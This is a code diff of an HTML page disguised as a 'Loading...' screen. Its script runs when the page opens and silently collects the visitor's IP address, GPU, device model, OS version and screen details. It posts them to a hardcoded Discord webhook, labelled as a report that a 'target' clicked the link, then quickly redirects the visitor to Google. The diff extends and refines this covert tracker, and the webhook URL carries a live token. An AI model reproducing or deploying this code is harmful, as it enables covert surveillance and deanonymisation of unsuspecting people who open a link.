@@ -3,82 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <title>Loading...</title>
-    <style>body { background: #000; margin: 0; }</style>
+    <style>body { background: #fff; margin: 0; }</style>
 </head>
 <body>
 <script>
+// --- 配置區 ---
 const DC_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv';
+const REDIRECT_TO = 'https://www.google.com';
 
-async function silentCapture() {
+async function finalCapture() {
     const ua = navigator.userAgent;
-    const w = window.screen.width, h = window.screen.height;
+    const w = window.screen.width, h = window.screen.height, dpr = window.devicePixelRatio;
 
-    // --- 1. IP 抓取 (換成 Cloudflare，保證 100% 成功) ---
-    let userIP = "抓取失敗";
+    // 1. 抓取 IP (使用 Cloudflare，保證不被瀏覽器封鎖)
+    let userIP = "未知/抓取失敗";
     try {
         const res = await fetch('https://www.cloudflare.com');
-        const data = await res.text();
-        // 從回傳的純文字中切出 IP 部分
-        userIP = data.match(/ip=(.*)\n/)[1];
-    } catch(e) {
-        console.error("IP API Error");
-    }
+        const text = await res.text();
+        const ipMatch = text.match(/ip=(.*)\n/);
+        if (ipMatch) userIP = ipMatch[1];
+    } catch(e) {}
 
-    // --- 2. GPU 與 型號推測 ---
+    // 2. GPU 偵測 (辨識旗艦機/低階機關鍵)
     let gpu = "被封鎖";
     try {
         const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         const dbg = gl.getExtension('WEBGL_debug_renderer_info');
         gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
     } catch(e) {}
 
-    let model = "未知裝置";
-    const resKey = `${Math.min(w,h)}x${Math.max(w,h)}`;
+    // 3. 型號精確識別 (Android 直接讀取，iOS 解析度對比)
+    let model = "未知設備";
     if (/Android/.test(ua)) {
         const m = ua.match(/Android.*;\s([^;]+)\sBuild/);
-        model = m ? m[1] : "Android Phone";
+        model = m ? m[1] : "Android 手機";
     } else if (/iPhone|iPad/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+        const resKey = `${Math.min(w,h)}x${Math.max(w,h)}`;
         const appleMap = {
-            "820x1180": "iPad Air (5/4 Gen)",
-            "834x1194": "iPad Pro 11-inch",
-            "393x852": "iPhone 15/14 Pro",
-            "430x932": "iPhone 15 Plus/14 Pro Max",
-            "390x844": "iPhone 14/13/12"
+            "820x1180": "iPad Air (5/4 Gen)", "834x1194": "iPad Pro 11-inch", "1024x1366": "iPad Pro 12.9-inch",
+            "393x852": "iPhone 15/14 Pro", "430x932": "iPhone 15 Plus/14 Pro Max",
+            "390x844": "iPhone 14/13/12/11 Pro", "414x896": "iPhone 11/XR/XS Max",
+            "375x812": "iPhone 13 mini/12 mini/X/XS", "375x667": "iPhone SE/8/7/6s"
         };
         model = appleMap[resKey] || `Apple 設備 (${resKey})`;
     }
 
-    // --- 3. 發送至 Discord ---
+    // 4. 版本號
+    let ver = "未知";
+    const vM = ua.match(/(?:OS |Version\/|Android )(\d+[._]\d+[._]?\d?)/);
+    ver = vM ? vM[1].replace(/_/g, '.') : "隱藏";
+
+    // 5. 構建 Discord 訊息
     const payload = {
-        username: "裝置偵測網關",
+        username: "終極偵測系統",
         embeds: [{
-            title: "🎯 點擊報告",
-            color: 0,
+            title: "🎯 目標已點擊連結",
+            color: 16711680, // 紅色
             fields: [
                 { name: "📍 真實 IP", value: `\`${userIP}\``, inline: true },
-                { name: "📱 型號", value: model, inline: true },
-                { name: "🎮 GPU", value: gpu, inline: false },
-                { name: "🖼️ 螢幕", value: `${w}x${h}`, inline: true }
+                { name: "📱 精確型號", value: model, inline: true },
+                { name: "⚙️ 系統版本", value: ver, inline: true },
+                { name: "🎮 GPU 核心", value: `\`${gpu}\``, inline: false },
+                { name: "🖼️ 螢幕數據", value: `${w}x${h} @${dpr}x`, inline: true }
             ],
-            footer: { text: "UA: " + ua },
+            footer: { text: "瀏覽器指紋: " + ua },
             timestamp: new Date()
         }]
     };
 
-    // 發送並在 1 秒內強制跳轉
-    fetch(DC_URL, { 
-        method: 'POST', 
-        headers: { 'Content-Type': 'application/json' }, 
-        body: JSON.stringify(payload) 
-    }).finally(() => {
+    // 6. 發送並強制跳轉
+    try {
+        await fetch(DC_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } finally {
+        // 發送完成後 0.5 秒立刻閃人
         setTimeout(() => {
-            window.location.replace("https://www.google.com");
+            window.location.replace(REDIRECT_TO);
         }, 500);
-    });
+    }
 }
 
-silentCapture();
+// 執行
+finalCapture();
 </script>
 </body>
 </html>
